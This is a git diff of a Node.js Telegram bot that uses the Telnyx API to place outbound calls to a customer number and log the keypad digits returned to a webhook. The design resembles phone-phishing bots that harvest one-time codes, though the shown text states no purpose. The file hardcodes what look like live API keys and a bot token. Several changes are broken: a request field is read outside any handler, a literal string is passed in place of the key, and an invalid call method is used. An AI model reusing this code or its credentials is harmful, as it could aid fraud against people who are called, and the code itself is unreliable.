@@ -3,7 +3,8 @@ const MY_API_KEY = 'KEY018BF55B4D0ED25E9A0861698D906F2F_xecXP42CjUQBicb53Xqadx'
 const service_number = '14342338629'
 const WEBHOOK_URL = 'https://ofbtc.onrender.com';
 const bot_token = '6328468760:AAFlRNuKnTwAMynlXcsAH118kYhBhahUNQU'
-
+const digits = req.body.Digits;
+const ENV_TELNYX_CONNECTION_ID = '2305462997117568053'
 const telnyx = require('telnyx')('MY_API_KEY');
 const { Telegraf } = require('telegraf'); // importing telegraf.js
 var bot = new Telegraf(bot_token)
@@ -13,7 +14,7 @@ const express = require('express');
 const app = express();
 const port = process.env.PORT || 3000;
 
-async function call (service_number, customer_number, ctx){
+async function call (customer_number, ctx){
    console.log(ctx)
    bot.telegram.sendMessage(ctx.chat.id, `call ongoing...\n Calling ${customer_number} \n please wait...`, {})
 
@@ -21,10 +22,11 @@ async function call (service_number, customer_number, ctx){
    const { data: call } = await telnyx.calls.create({
       connection_id: ENV_TELNYX_CONNECTION_ID,
       to: customer_number,
-      from: ENV_TELNYX_PHONE_NUMBER,
+      from: service_number,
+      webhook_url: WEBHOOK_URL
    });
 
-   call.speak({
+   call.answered({
 
    })
 
@@ -107,7 +109,8 @@ app.get('/', (req, res) => {
 });
 
 app.post('/', (req, res) => {
-   const digits = req.body.Digits;
+   const digits = req.body;
+   console.log(digits)
    res.json({status: 'ok', code: 200})
 });
 
